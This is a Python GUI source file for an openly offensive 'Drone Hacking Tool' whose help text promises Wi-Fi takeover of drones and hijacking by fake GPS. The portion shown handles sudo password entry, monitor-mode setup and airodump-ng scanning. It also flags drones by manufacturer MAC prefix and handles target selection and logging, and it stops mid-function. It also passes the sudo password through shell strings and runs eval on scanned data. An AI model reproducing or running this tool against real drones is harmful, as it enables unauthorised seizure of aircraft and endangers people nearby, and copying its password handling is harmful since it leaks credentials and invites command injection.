# -*- coding: utf-8 -*-
import os, time, subprocess, threading, ipaddress, paramiko, socket
import io
import re, signal
import changed_password_generator, changed_password_generator_lite
import pandas as pd
import tkinter as tk
from socket import AF_INET, SOCK_DGRAM
from tkinter import ttk, messagebox, TclError, simpledialog, Toplevel, Menu, PhotoImage, filedialog
from tkinter.ttk import Treeview
from tkinter import font as tkfont
from pathlib import Path
from threading import Thread


class SampleApp(tk.Tk):

    def __init__(self, *args, **kwargs):
        tk.Tk.__init__(self, *args, **kwargs)

        self.title_font = tkfont.Font(family = "Helvetica", size = 26, weight = "bold", slant = "italic")
        self.subtitle_font = tkfont.Font(size = 17)
        self.start_page_button_font = tkfont.Font(size = 20)
        self.drone_control_button_font = tkfont.Font(size = 20)
        self.button_font = tkfont.Font(size = 12)
        self.label_font = tkfont.Font(size = 15)
        self.info_font = tkfont.Font(size = 12)

        self.progressbar_color = ttk.Style()
        self.progressbar_color.configure("green.Horizontal.TProgressbar", background='#07f523')
        self.treeview_style = ttk.Style()
        self.treeview_style.configure("font.Treeview", font=(None, 11))

        # the container is where we'll stack a bunch of frames
        # on top of each other, then the one we want visible
        # will be raised above the others
        container = tk.Frame(self)
        container.pack(side = "top", fill = "both", expand = True)
        container.grid_rowconfigure(0, weight = 1)
        container.grid_columnconfigure(0, weight = 1)

        self.frames = {}
        for F in (StartPage, SelectInterface, RFLocationSelect, APDisplay, GetSelectedAPClientINFO, WifiAttack, RemoteServerConnect, DroneControl, FindHackrfDevice):
            page_name = F.__name__
            frame = F(parent = container, controller = self)
            self.frames[page_name] = frame

            # put all of the pages in the same location;
            # the one on the top of the stacking order
            # will be the one that is visible.
            frame.grid(row = 0, column = 0, sticky = "nsew")

        self.show_frame("StartPage")

    def show_frame(self, page_name):
        '''Show a frame for the given page name'''
        frame = self.frames[page_name]
        frame.event_generate("<<ShowFrame>>")
        frame.tkraise()
        frame.config(background="white")
        try: #Try to update meun bar
            menubar = frame.menubar(self)
            self.configure(menu = menubar)
        except:
            pass


class StartPage(tk.Frame):

    def __init__(self, parent, controller):
        global current_path
        tk.Frame.__init__(self, parent)
        self.controller = controller
        self.askstring_runtime_counter = 0

        get_current_path = Path(__file__).parent.absolute()
        current_path = str(get_current_path)

        title_label = tk.Label(self,  background = "white", text = "Welcome", font = controller.title_font)
        title_label.pack(side = "top", fill = "x", pady = 10)

        subtitle_label = tk.Label(self, background = "white", text = "Please select service", font = controller.subtitle_font)
        subtitle_label.pack()

        try:
            self.wifi_base_drone_button_icon = tk.PhotoImage(file = current_path + "/data/gui_img/wifi_icon.png")
            self.fake_gps_button_icon = tk.PhotoImage(file = current_path + "/data/gui_img/rf_icon.png")

            wifi_base_drone_button = tk.Button(self, background = "white", text = "Wi-Fi base drone", font = controller.start_page_button_font, image = self.wifi_base_drone_button_icon, compound = "top", width = 100,
                                command = lambda: self.sudo_password_input("wifi_base"))
            wifi_base_drone_button.pack(side = "left", fill = "both", padx = 10, pady = 5, expand = True)
        
            fake_gps_button = tk.Button(self, background = "white", text = "Fake GPS", font = controller.start_page_button_font, image = self.fake_gps_button_icon, compound = "top", width = 100,
                                command = lambda: self.sudo_password_input("rf_base"))
            fake_gps_button.pack(side = "right", fill = "both", padx = 10, pady = 5, expand = True)
        except: #If icon not found
            wifi_base_drone_button = tk.Button(self, background = "white", text = "Wi-Fi base drone", font = controller.start_page_button_font, width = 20,
                                command =  lambda: self.sudo_password_input("wifi_base"))
            wifi_base_drone_button.pack(side = "left", fill = "both", padx = 10, pady = 5, expand = True)
        
            fake_gps_button = tk.Button(self, background = "white", text = "Fake GPS", font = controller.start_page_button_font, width = 20,
                                command = lambda: self.sudo_password_input("rf_base"))
            fake_gps_button.pack(side = "right", fill = "both", padx = 10, pady = 5, expand = True)

    def menubar(self, tool):
        menubar = tk.Menu(tool)
        option_tool = tk.Menu(menubar, tearoff = 0)
        option_tool.add_command(label = "Wi-Fi base drone", command = lambda: self.sudo_password_input("wifi_base"))
        option_tool.add_command(label = "RF base drone", command = lambda: self.sudo_password_input("rf_base"))
        option_tool.add_separator()  
        option_tool.add_command(label = "Exit", command = lambda: quit())
        menubar.add_cascade(label = "Option", menu = option_tool)
        help_tool = tk.Menu(menubar, tearoff = 0)
        help_tool.add_command(label = "Page guide", command = lambda: messagebox.showinfo("Page Guide",
                                    "Thank you for using this programe.\nTo start, please select one option on the page.\n\nWi-Fi base drone: Exploit Wi-Fi attack to get the drone control rights.\n\nRF base drone: Using fake GPS signal to hijack the drone."))
        help_tool.add_command(label = "About", command = lambda: messagebox.showinfo("Drone Hacking Tool",
                                    "Code name: Barbary lion\nVersion: 1.1.2.111\n\nGroup member:\nSam KAN\nMichael YUEN\nDicky SHEK"))
        menubar.add_cascade(label = "Help", menu = help_tool)
        return menubar

    def sudo_password_input(self, user_selected_service):
        #print(user_selected_service)
        global sudo_password
        if self.askstring_runtime_counter < 1:
            sudo_password = simpledialog.askstring("Authentication Required", "Authentication is required to run this program\nPassword:", show = "*")
            self.askstring_runtime_counter = self.askstring_runtime_counter + 1
        if sudo_password == "":
            if messagebox.showerror("Error", "You must type in password."):
                quit()
        elif sudo_password == None:
            quit()
        elif sudo_password != "":
            sudo_password_validation = "echo " + sudo_password + " | sudo -S ls" #Root password validation
            get_sudo_password_validation_states = subprocess.Popen(sudo_password_validation, stdout = subprocess.PIPE, stderr = subprocess.STDOUT, shell = True, universal_newlines = True).stdout
            sudo_password_validation_states = get_sudo_password_validation_states.read().splitlines()
            sudo_password_validation_states_convert = str(sudo_password_validation_states) #Convert to string
            if "incorrect password attempt" in sudo_password_validation_states_convert:
                if messagebox.showerror("Authentication failed", "Invalid password, please try again."):
                    quit()
            else:
                if user_selected_service == "wifi_base":
                    self.controller.show_frame("SelectInterface")
                elif user_selected_service == "rf_base":
                    self.controller.show_frame("FindHackrfDevice")
                        

class SelectInterface(tk.Frame):

    def __init__(self, parent, controller):
        tk.Frame.__init__(self, parent)
        self.controller = controller
        self.bind("<<ShowFrame>>", self.select_interface_gui)

    def select_interface_gui(self, event):
        self.title_label = tk.Label(self, background = "white", text = "Select Wi-Fi adapter:", font = self.controller.title_font)
        self.title_label.pack(side = "top", fill = "x", pady = 10)

        try:
            self.label_wifi_adapter_label_image = tk.PhotoImage(file = current_path + "/data/gui_img/wifi_adapter.png")

            self.wifi_adapter_label = tk.Label(self, background = "white", image = self.label_wifi_adapter_label_image)
            self.wifi_adapter_label.pack(side = "top", pady = 10)
        except:
            self.wifi_adapter_label = tk.Label(self, background = "white", text = "IEEE 802.11 adapter", font = self.controller.label_font)
            self.wifi_adapter_label.pack(side = "top", pady = 10)

        self.adapter_listBox = tk.Listbox(self, font = self.controller.label_font, selectmode = tk.SINGLE)
        self.adapter_listBox.pack()
        
        try:
            self.back_button_icon = tk.PhotoImage(file = current_path + "/data/gui_img/back_icon.png")
            self.next_button_icon = tk.PhotoImage(file = current_path + "/data/gui_img/next_icon.png")

            self.back_button = tk.Button(self, background = "white", text="Back", font = self.controller.button_font, image = self.back_button_icon, compound = "left",
                               command = lambda: [self.destroy_select_interface_gui(), self.controller.show_frame("StartPage")])
            self.back_button.pack(side = "left", anchor = "sw")

            self.next_button = tk.Button(self, background = "white", text="Next", font = self.controller.button_font, image = self.next_button_icon, compound = "right",
                            command = self.check_selection)
            self.next_button.pack(side = "right", anchor = "se")
        except: #If icon not found
            self.back_button = tk.Button(self, background = "white", text="Back", font = self.controller.button_font,
                               command = lambda: [self.destroy_select_interface_gui(), self.controller.show_frame("StartPage")])
            self.back_button.pack(side = "left", anchor = "sw")

            self.next_button = tk.Button(self, background = "white", text="Next", font = self.controller.button_font,
                            command = self.check_selection)
            self.next_button.pack(side = "right", anchor = "se")
        self.load_interface()

    def menubar(self, tool):
        menubar = tk.Menu(tool)
        option_tool = tk.Menu(menubar, tearoff = 0)
        option_tool.add_command(label = "Back", command = lambda: [self.destroy_select_interface_gui(), self.controller.show_frame("StartPage")])
        option_tool.add_separator()  
        option_tool.add_command(label = "Exit", command = lambda: quit())
        menubar.add_cascade(label = "Option", menu = option_tool)
        help_tool = tk.Menu(menubar, tearoff = 0)
        help_tool.add_command(label = "Page guide", command = lambda: messagebox.showinfo("Page Guide",
                                    "Please ready your Wi-Fi adapter, and make sure your adapter supports 'monitor' mode.\n\nIf you are connected to your Wi-Fi adapter correctly, you can see the adapter name on the screen."))
        help_tool.add_command(label = "About", command = lambda: messagebox.showinfo("Drone Hacking Tool",
                                    "Code name: Barbary lion\nVersion: 1.1.2.111\n\nGroup member:\nSam KAN\nMichael YUEN\nDicky SHEK"))
        menubar.add_cascade(label = "Help", menu = help_tool)
        return menubar
    
    def load_interface(self, runtime_counter = 0):
        if runtime_counter < 1:
            adapter_info = subprocess.Popen("iw dev 2>&1 | grep Interface | awk '{print $2}'", stdout = subprocess.PIPE, shell = True, universal_newlines = True).stdout
            self.adapter_info_list = adapter_info.read().splitlines()
            self.adapter_listBox.delete(0, "end")
            app.after(10, lambda: self.load_interface(runtime_counter + 1)) #Wait 10 ms for loop
        else:
            if not self.adapter_info_list: #If no Wi-Fi adapter found
                selected_interface_timestamp = time.strftime("%Y/%m/%d-%H:%M:%S") #Create a timestamp
                self.check_log_file = Path(current_path + "/data/hack_drone_log.csv")
                if self.check_log_file.is_file(): #Check "hack_drone_log.csv" is really exist
                    target_BSSID_log = [""]
                    channel_log = [""]
                    privacy_log = [""]
                    password_log = [""]
                    manufacturer_log = [""]
                    client_BSSID_log = [""]
                    selected_ap_timestamp_log = [selected_interface_timestamp]
                    states_log = ["Error: No interface found"]
                    dataframe = pd.DataFrame({"target_BSSID":target_BSSID_log, "channel":channel_log, "privacy":privacy_log, "password":password_log, "manufacturer":manufacturer_log, "client_BSSID":client_BSSID_log,"timestamp":selected_ap_timestamp_log, "states":states_log})
                    dataframe.to_csv(current_path + "/data/hack_drone_log.csv", index = False, sep = ',', mode = "a", header = False) #Write log data to "drone_attack_log.csv"    
                if messagebox.showerror("Error", "No interface found."):
                    self.destroy_select_interface_gui()
                    self.controller.show_frame("StartPage")
            else:
                for values in self.adapter_info_list:
                    self.adapter_listBox.insert("end", values)

    def check_selection(self):
        global selected_interface
        try: #If user selected Wi-Fi interface
            self.index_adapter_listBox = int(self.adapter_listBox.curselection()[0])
            get_user_selected_interface = [self.adapter_listBox.get(values) for values in self.adapter_listBox.curselection()]
            selected_interface_convert = str(get_user_selected_interface) #Convert to string
            selected_interface_convert_strip = selected_interface_convert.strip("[(,)]") #Remove characters "[(,)]"
            selected_interface = eval(selected_interface_convert_strip) #Remove characters "''"
            message_user_select = ("Adapter " + selected_interface + " selected.")            
            if messagebox.askokcancel("Selected Wi-Fi Interface", message_user_select):
                selected_interface_timestamp = time.strftime("%Y/%m/%d-%H:%M:%S") #Create a timestamp
                self.check_log_file = Path(current_path + "/data/hack_drone_log.csv")
                if self.check_log_file.is_file(): #Check "hack_drone_log.csv" is really exist
                    target_BSSID_log = [""]
                    channel_log = [""]
                    privacy_log = [""]
                    password_log = [""]
                    manufacturer_log = [""]
                    client_BSSID_log = [""]
                    selected_ap_timestamp_log = [selected_interface_timestamp]
                    states_log = ["Adapter " + selected_interface + " selected"]
                    dataframe = pd.DataFrame({"target_BSSID":target_BSSID_log, "channel":channel_log, "privacy":privacy_log, "password":password_log, "manufacturer":manufacturer_log, "client_BSSID":client_BSSID_log,"timestamp":selected_ap_timestamp_log, "states":states_log})
                    dataframe.to_csv(current_path + "/data/hack_drone_log.csv", index = False, sep = ',', mode = "a", header = False) #Write log data to "drone_attack_log.csv"     
                self.destroy_select_interface_gui()
                self.controller.show_frame("APDisplay")
        except IndexError:
            selected_interface_timestamp = time.strftime("%Y/%m/%d-%H:%M:%S") #Create a timestamp
            self.check_log_file = Path(current_path + "/data/hack_drone_log.csv")
            if self.check_log_file.is_file(): #Check "hack_drone_log.csv" is really exist
                target_BSSID_log = [""]
                channel_log = [""]
                privacy_log = [""]
                password_log = [""]
                manufacturer_log = [""]
                client_BSSID_log = [""]
                selected_ap_timestamp_log = [selected_interface_timestamp]
                states_log = ["Error: Wi-Fi interface is not selected"]
                dataframe = pd.DataFrame({"target_BSSID":target_BSSID_log, "channel":channel_log, "privacy":privacy_log, "password":password_log, "manufacturer":manufacturer_log, "client_BSSID":client_BSSID_log,"timestamp":selected_ap_timestamp_log, "states":states_log})
                dataframe.to_csv(current_path + "/data/hack_drone_log.csv", index = False, sep = ',', mode = "a", header = False) #Write log data to "drone_attack_log.csv"  
            messagebox.showwarning("Tips", "You need to select interface.")
            
    def destroy_select_interface_gui(self): #Kill select_interface_gui object
        self.title_label.destroy()
        self.wifi_adapter_label.destroy()
        self.adapter_listBox.destroy()
        self.back_button.destroy()
        self.next_button.destroy()


class APDisplay(tk.Frame):

    def __init__(self, parent, controller):
        tk.Frame.__init__(self, parent)
        self.controller = controller
        self.bind("<<ShowFrame>>", self.thread_control)
        self.access_point_list_refresh_states = True
        self.drone_manufacturer_list_missing_warning = True

    def thread_control(self, event):
        threading.Thread(target = self.ap_display_gui).start()
        threading.Thread(target = self.load_access_point).start()

    def ap_display_gui(self):
        self.title_label = tk.Label(self, background = "white", text="Select target:", font = self.controller.title_font)
        self.title_label.pack(side = "top", fill = "x", pady = 10)

        try:
            self.stop_start_button_pause_icon = tk.PhotoImage(file = current_path + "/data/gui_img/pause_icon.png")
            self.stop_start_button_start_icon = tk.PhotoImage(file = current_path + "/data/gui_img/start_icon.png")
            
            self.stop_start_button = tk.Button(self, background = "white", text = "Stop scanning", font = self.controller.button_font, state = "disable", image = self.stop_start_button_pause_icon, compound = "left",
                           command = lambda: self.stop_start_scanning())
            self.stop_start_button.pack(side = "top", anchor = "e")
        except: #If icon not found
            self.stop_start_button = tk.Button(self, background = "white", text = "Stop scanning", font = self.controller.button_font, state = "disable",
                               command = lambda: self.stop_start_scanning())
            self.stop_start_button.pack(side = "top", anchor = "e")

        self.ap_display_tree = ttk.Treeview(self, style = "font.Treeview", columns=["1", "2", "3", "4", "5", "6", "7"], show = "headings")
        self.ap_display_tree.column("1", width = 130, anchor = "center")
        self.ap_display_tree.column("2", width = 170, anchor = "center")
        self.ap_display_tree.column("3", width = 40, anchor = "center")
        self.ap_display_tree.column("4", width = 40, anchor = "center")
        self.ap_display_tree.column("5", width = 40, anchor = "center")
        self.ap_display_tree.column("6", width = 60, anchor = "center")
        self.ap_display_tree.column("7", width = 40, anchor = "center")
        self.ap_display_tree.heading("1", text = "BSSID")
        self.ap_display_tree.heading("2", text = "ESSID")
        self.ap_display_tree.heading("3", text = "Channel")
        self.ap_display_tree.heading("4", text = "Privacy")
        self.ap_display_tree.heading("5", text = "Cipher")
        self.ap_display_tree.heading("6", text = "Authentication")
        self.ap_display_tree.heading("7", text = "Power")
        self.ap_display_tree.tag_configure("matched_drone_list", background = "yellow")
        self.ap_display_tree.pack(side = "top", fill = "both", expand = True)

        self.progressbar = ttk.Progressbar(self, style = "green.Horizontal.TProgressbar", orient = "horizontal", mode = "determinate")
        self.progressbar.pack(fill = "x")

        self.info_label = tk.Label(self, background = "white", text = "Switching Wi-Fi adapter to monitor mode.", font = self.controller.info_font)
        self.info_label.pack(side = "left")

        try:
            self.next_button_icon = tk.PhotoImage(file = current_path + "/data/gui_img/next_icon.png")
            
            self.next_button = tk.Button(self, background = "white", text = "Next", font = self.controller.button_font, image = self.next_button_icon, compound = "right",
                               command = lambda: self.check_selection())
            self.next_button.pack(side = "right", anchor = "se")
        except: #If icon not found
            self.next_button = tk.Button(self, background = "white", text = "Next", font = self.controller.button_font,
                               command = lambda: self.check_selection())
            self.next_button.pack(side = "right", anchor = "se")

    def menubar(self, tool):
        menubar = tk.Menu(tool)
        option_tool = tk.Menu(menubar, tearoff = 0)
        option_tool.add_command(label = "Home", command = lambda: self.menubar_home())
        option_tool.add_separator()  
        option_tool.add_command(label = "Exit", command = lambda: quit(), state = "disable")
        menubar.add_cascade(label = "Option", menu = option_tool)
        help_tool = tk.Menu(menubar, tearoff = 0)
        help_tool.add_command(label = "Page guide", command = lambda: messagebox.showinfo("Page Guide",
                                    "To continue, please select one Wi-Fi access point.\n\nThe program will scan the nearby Wi-Fi access point. If the Wi-Fi network is broadcast from the drone, and match with the 'drone manufacturer list' files, the program will highlight that Wi-Fi access point."))
        help_tool.add_command(label = "About", command = lambda: messagebox.showinfo("Drone Hacking Tool",
                                    "Code name: Barbary lion\nVersion: 1.1.2.111\n\nGroup member:\nSam KAN\nMichael YUEN\nDicky SHEK"))
        menubar.add_cascade(label = "Help", menu = help_tool)
        return menubar

    def menubar_home(self):
        try:
            self.progressbar.stop()
            time.sleep(0.5)
            self.destroy_ap_display_gui()
            self.controller.show_frame("StartPage")
        except:
            pass

    def load_access_point(self):
        #print("User selected " + selected_interface)
        check_wifi_connect_states = "nmcli d show " + selected_interface + " 2>&1 | grep 'GENERAL.STATE:' | awk '{print $3}'"
        get_wifi_connect_states = subprocess.Popen(check_wifi_connect_states, stdout = subprocess.PIPE, shell = True, universal_newlines = True).stdout #Get Wi-Fi connection state
        wifi_connect_states = get_wifi_connect_states.read().splitlines()
        wifi_connect_state_convert = str(wifi_connect_states) #Convert to string
        wifi_connect_states_strip = wifi_connect_state_convert.strip("[]") #Remove characters "[]"
        wifi_connect_states_strip_bracket = eval(wifi_connect_states_strip) #Remove characters "''"
        return_wifi_connect_states = wifi_connect_states_strip_bracket.strip("()") #Remove characters "()"
        disconect_wifi = "nmcli dev disconnect " + selected_interface
        if return_wifi_connect_states == "connected": #If Wi-Fi connected
            disconnect_wifi = subprocess.Popen(disconect_wifi, stdout = subprocess.PIPE, shell = True)
            disconnect_wifi.wait()
        elif return_wifi_connect_states == "connecting": #If connecting a Wi-Fi network
            disconnect_wifi = subprocess.Popen(disconect_wifi, stdout = subprocess.PIPE, shell = True)
            disconnect_wifi.wait()
        interface_down = "echo " + sudo_password + " | sudo -S ifconfig " + selected_interface + " down"
        interface_mode_monitor = "echo " + sudo_password + " | sudo -S iwconfig " + selected_interface + " mode monitor"
        interface_up = "echo " + sudo_password + " | sudo -S ifconfig " + selected_interface + " up"
        interface_down_states = subprocess.Popen(interface_down, stdout = subprocess.PIPE, shell = True)
        interface_down_states.wait()
        interface_mode_monitor_states = subprocess.Popen(interface_mode_monitor, stdout = subprocess.PIPE, shell = True)
        interface_mode_monitor_states.wait()
        interface_up_states = subprocess.Popen(interface_up, stdout = subprocess.PIPE, shell = True)
        interface_up_states.wait()
        self.check_dump_file = Path(current_path + "/data/ap_list-01.csv")
        if self.check_dump_file.is_file(): #Check "ap_list-01.csv" is really exist
            subprocess.Popen("echo " + sudo_password + " | sudo -S rm " + current_path + "/data/ap_list-01.csv", stdout = subprocess.PIPE, shell = True)
        access_point_info = "echo " + sudo_password + " | sudo -S xterm -iconic -T 'accesspointinfo' -hold -e 'airodump-ng " + selected_interface + " -w " + current_path + "/data/ap_list -o csv'"
        get_access_point_info_states = subprocess.Popen(access_point_info, stdout = subprocess.PIPE, shell=True)
        access_point_info_states = get_access_point_info_states.poll()
        while access_point_info_states == None:
            time.sleep(1.0)
            self.wait_for_csv_file()
            break
     
    def wait_for_csv_file(self):
        self.info_label.config(text = "Collecting Access Point data.")
        self.progressbar.start(70)
        time.sleep(7.0)
        self.progressbar.stop()
        self.thread_access_point_list_update = threading.Thread(target = self.access_point_list_update)
        self.thread_access_point_list_update.start()
        self.stop_start_button.config(state = "normal")

    def access_point_list_update(self):
        try:
            read_ap_list_cap = pd.read_csv(current_path + "/data/ap_list-01.csv", usecols=[0, 3, 5, 6, 7, 8, 13]) #Read csv "ap_list-01.csv" file
            read_ap_list_cap_df = pd.DataFrame(read_ap_list_cap, columns = ["BSSID", " ESSID", " channel", " Privacy", " Cipher", " Authentication", " Power"])
            read_ap_list_cap_df_drop_nan = read_ap_list_cap_df.dropna() #Drop values "NaN" in the CSV file
            read_ap_list_cap_df_rename_header = read_ap_list_cap_df_drop_nan.rename(columns = {" channel": "channel", " Privacy": "Privacy", " Cipher": "Cipher", " Authentication": "Authentication", " Power": "Power", " ESSID": "ESSID"}) #Remove spaces in the header
            read_ap_list_cap_df_rename_header["channel"] = read_ap_list_cap_df_rename_header["channel"].str.strip().astype(int) #Convert to integer
            read_ap_list_cap_df_rename_header["Privacy"] = read_ap_list_cap_df_rename_header["Privacy"].str.strip()
            read_ap_list_cap_df_rename_header["Cipher"] = read_ap_list_cap_df_rename_header["Cipher"].str.strip()
            read_ap_list_cap_df_rename_header["Authentication"] = read_ap_list_cap_df_rename_header["Authentication"].str.strip()
            read_ap_list_cap_df_rename_header["ESSID"] = read_ap_list_cap_df_rename_header["ESSID"].str.strip()
            read_ap_list_cap_df_channel_filter = read_ap_list_cap_df_rename_header[read_ap_list_cap_df_rename_header['channel'] > 0] #Drop abnormal data
            read_ap_list_cap_df_channel_sort = read_ap_list_cap_df_channel_filter.sort_values(by = "channel", ascending = True) #Sort value by column "channel"
            read_ap_list_cap_df_power_filter = read_ap_list_cap_df_channel_sort[read_ap_list_cap_df_channel_sort.Power != -1.0] #Drop abnormal data
            read_ap_list_cap_df_privacy_filter = read_ap_list_cap_df_power_filter[(read_ap_list_cap_df_power_filter.Privacy != "WEP")] #Filter useless data for drone
            read_ap_list_cap_df_authentication_filter = read_ap_list_cap_df_privacy_filter[(read_ap_list_cap_df_privacy_filter.Authentication != "MGT")] #Filter useless data for drone
            self.check_drone_manufacturer_list = Path(current_path + "/data/drone_manufacturer_list.csv")
            if self.check_drone_manufacturer_list.is_file(): #Check "drone_manufacturer_list" is really exist
                self.drone_manufacturer_list_missing_warning = True
                read_drone_manufacturer_list_cap = pd.read_csv(current_path + "/data/drone_manufacturer_list.csv") #Read csv "drone_manufacturer_list.csv" file
                read_drone_manufacturer_list_df = pd.DataFrame(read_drone_manufacturer_list_cap)
                compare_source = read_ap_list_cap_df_authentication_filter
                matched_drone = compare_source[compare_source["BSSID"].str.contains("|".join(read_drone_manufacturer_list_df["Drone_MAC_list"]))]
                #print(matched_drone)
                read_ap_list_cap_df_duplicates_index = set(read_ap_list_cap_df_authentication_filter.index).intersection(matched_drone.index) #Index duplicates data
                read_ap_list_cap_df_duplicates = read_ap_list_cap_df_authentication_filter.drop(read_ap_list_cap_df_duplicates_index, axis = 0)
                matched_drone_list = matched_drone.values.tolist()
                access_point_list = read_ap_list_cap_df_duplicates.values.tolist()
                for display_matched_drone_list in matched_drone_list: #Print matched drone list
                    self.ap_display_tree.insert("", "end", values = display_matched_drone_list, tags = ("matched_drone_list"))
                for display_access_point_list in access_point_list: #Print AP's information
                    self.ap_display_tree.insert("", "end", values = display_access_point_list)
                threading.Thread(target = self.access_point_list_refresh).start()
            else:
                if self.drone_manufacturer_list_missing_warning == True:
                    if messagebox.showwarning("Error", "File 'drone_manufacturer_list' not found."):
                        self.drone_manufacturer_list_missing_warning = False
                        access_point_list = read_ap_list_cap_df_authentication_filter.values.tolist()
                        for display_access_point_list in access_point_list: #Print AP's information
                            self.ap_display_tree.insert("", 'end', values = display_access_point_list)
                        threading.Thread(target = self.access_point_list_refresh).start()
                elif self.drone_manufacturer_list_missing_warning == False:
                    access_point_list = read_ap_list_cap_df_authentication_filter.values.tolist()
                    for display_access_point_list in access_point_list: #Print AP's information
                        self.ap_display_tree.insert("", 'end', values = display_access_point_list)
                    threading.Thread(target = self.access_point_list_refresh).start()
        except:
            selected_ap_timestamp = time.strftime("%Y/%m/%d-%H:%M:%S") #Create a timestamp
            self.check_log_file = Path(current_path + "/data/hack_drone_log.csv")
            if self.check_log_file.is_file(): #Check "hack_drone_log.csv" is really exist
                target_BSSID_log = [""]
                channel_log = [""]
                privacy_log = [""]
                password_log = [""]
                manufacturer_log = [""]
                client_BSSID_log = [""]
                selected_ap_timestamp_log = [selected_ap_timestamp]
                states_log = ["Error: No Access Point found"]
                dataframe = pd.DataFrame({"target_BSSID":target_BSSID_log, "channel":channel_log, "privacy":privacy_log, "password":password_log, "manufacturer":manufacturer_log, "client_BSSID":client_BSSID_log,"timestamp":selected_ap_timestamp_log, "states":states_log})
                dataframe.to_csv(current_path + "/data/hack_drone_log.csv", index = False, sep = ',', mode = "a", header = False) #Write log data to "drone_attack_log.csv"
            if messagebox.askretrycancel("Error", "No Access Point found."):
                self.access_point_list_update()
                
    def access_point_list_refresh(self):
        self.info_label.config(text = "Automatically update in every 10 seconds.")
        self.progressbar.start(100)
        sleep_time_count = 0
        while self.access_point_list_refresh_states == True and sleep_time_count < 10:
            time.sleep(0.5)
            sleep_time_count = sleep_time_count + 0.5
            if sleep_time_count == 5:
                self.info_label.config(text = "Yellow highlighting row is mean drone.")
        self.progressbar.stop()
        if self.access_point_list_refresh_states:
            for ap_display_tree_item in self.ap_display_tree.get_children(): #Clean all data in TreeView
                self.ap_display_tree.delete(ap_display_tree_item)
            self.access_point_list_update()

    def stop_start_scanning(self):
        if self.stop_start_button['text'] == "Stop scanning": #If user is first time to press the button
            self.access_point_list_refresh_states = False
            self.info_label.config(text = "Automatically update is disable.")
            self.progressbar.stop()
            try:
                self.stop_start_button.config(text = "Start scanning", image = self.stop_start_button_start_icon)
            except: #If icon not found
                self.stop_start_button.config(text = "Start scanning")
        else:
            self.access_point_list_refresh_states = True
            for ap_display_tree_item in self.ap_display_tree.get_children(): #Clean all data in TreeView
                self.ap_display_tree.delete(ap_display_tree_item)
            self.access_point_list_update()
            try:
                self.stop_start_button.config(text = "Stop scanning", image = self.stop_start_button_pause_icon)
            except: #If icon not found
                self.stop_start_button.config(text = "Stop scanning")
        
    def check_selection(self):
        global selected_bssid, selected_channel, selected_privacy, matched_manufacturer
        for ap_display_tree_item in self.ap_display_tree.selection(): #Get user selection
            selected_item = self.ap_display_tree.item(ap_display_tree_item, "values")         
            if selected_item[1] == "": #If BSSID is null
                message_user_select = ("BSSID " + selected_item[0] + " " + "selected.")
            else:
                message_user_select = ("BSSID " + selected_item[0] + " (" + selected_item[1] + ") " + "selected.")
            if messagebox.askokcancel("Selected Target", message_user_select):
                self.progressbar.stop() 
                selected_bssid = selected_item[0]
                selected_channel = selected_item[2].strip("{ }") #Remove characters "{ }"
                selected_privacy = selected_item[3].strip("{ }") #Remove characters "{ }"
                self.check_drone_manufacturer_list = Path(current_path + "/data/drone_manufacturer_list.csv")
                if self.check_drone_manufacturer_list.is_file(): #Check "drone_manufacturer_list" is really exist
                    read_drone_manufacturer_list_cap = pd.read_csv(current_path + "/data/drone_manufacturer_list.csv") #Read csv "drone_manufacturer_list.csv" file
                    read_drone_manufacturer_list_df = pd.DataFrame(read_drone_manufacturer_list_cap)
                    consider_manufacturer = selected_bssid[:-6]
                    get_matched_manufacturer = read_drone_manufacturer_list_df[read_drone_manufacturer_list_df["Drone_MAC_list"].str.contains(consider_manufacturer)]
                    selected_manufacturer_column = get_matched_manufacturer["Manufacturer"]
                    matched_manufacturer_list = selected_manufacturer_column.values.tolist()
                    #print(matched_manufacturer_list)
                    if len(matched_manufacturer_list) == 0:
                        self.check_drone_manufacturer_list = Path(current_path + "/data/drone_manufacturer_list.csv")
                        if self.check_drone_manufacturer_list.is_file(): #Check "drone_manufacturer_list" is really exist
                            read_drone_manufacturer_list_cap = pd.read_csv(current_path + "/data/drone_manufacturer_list.csv") #Read csv "drone_manufacturer_list.csv" file
                            read_drone_manufacturer_list_df = pd.DataFrame(read_drone_manufacturer_list_cap)
                            consider_manufacturer = selected_bssid[:-9]
                            get_matched_manufacturer = read_drone_manufacturer_list_df[read_drone_manufacturer_list_df["Drone_MAC_list"].str.contains(consider_manufacturer)]
                            selected_manufacturer_column = get_matched_manufacturer["Manufacturer"]
                            matched_manufacturer_list = selected_manufacturer_column.values.tolist()
                            #print(matched_manufacturer_list)
                        if len(matched_manufacturer_list) == 0:
                            matched_manufacturer = "Not found"
                        else:
                            matched_manufacturer_list_convert = str(matched_manufacturer_list) #Convert to string
                            matched_manufacturer_list_strip = matched_manufacturer_list_convert.strip("[]") #Remove characters "[]"
                            matched_manufacturer_list_strip_bracket = eval(matched_manufacturer_list_strip) #Remove characters "''"
                            matched_manufacturer = matched_manufacturer_list_strip_bracket.strip("()") #Remove characters "()"
                    else:
                        matched_manufacturer_list_convert = str(matched_manufacturer_list) #Convert to string
                        matched_manufacturer_list_strip = matched_manufacturer_list_convert.strip("[]") #Remove characters "[]"
                        matched_manufacturer_list_strip_bracket = eval(matched_manufacturer_list_strip) #Remove characters "''"
                        matched_manufacturer = matched_manufacturer_list_strip_bracket.strip("()") #Remove characters "()"
                else:
                    matched_manufacturer = "Not found"
                selected_ap_timestamp = time.strftime("%Y/%m/%d-%H:%M:%S") #Create a timestamp
                self.check_log_file = Path(current_path + "/data/hack_drone_log.csv")
                if self.check_log_file.is_file(): #Check "hack_drone_log.csv" is really exist
                    target_BSSID_log = [selected_bssid]
                    channel_log = [selected_channel]
                    privacy_log = [selected_privacy]
                    password_log = [""]
                    manufacturer_log = [matched_manufacturer]
                    client_BSSID_log = [""]
                    selected_ap_timestamp_log = [selected_ap_timestamp]
                    states_log = ["Target Access Point selected"]
                    dataframe = pd.DataFrame({"target_BSSID":target_BSSID_log, "channel":channel_log, "privacy":privacy_log, "password":password_log, "manufacturer":manufacturer_log, "client_BSSID":client_BSSID_log,"timestamp":selected_ap_timestamp_log, "states":states_log})
                    dataframe.to_csv(current_path + "/data/hack_drone_log.csv", index = False, sep = ",", mode = "a", header = False) #Write log data to "drone_attack_log.csv"
                self.access_point_list_refresh_states = False
                threading.Thread(target = self.destroy_ap_display_gui).start()
                self.controller.show_frame("GetSelectedAPClientINFO")
            break
        else:
            selected_ap_timestamp = time.strftime("%Y/%m/%d-%H:%M:%S") #Create a timestamp
            self.check_log_file = Path(current_path + "/data/hack_drone_log.csv")
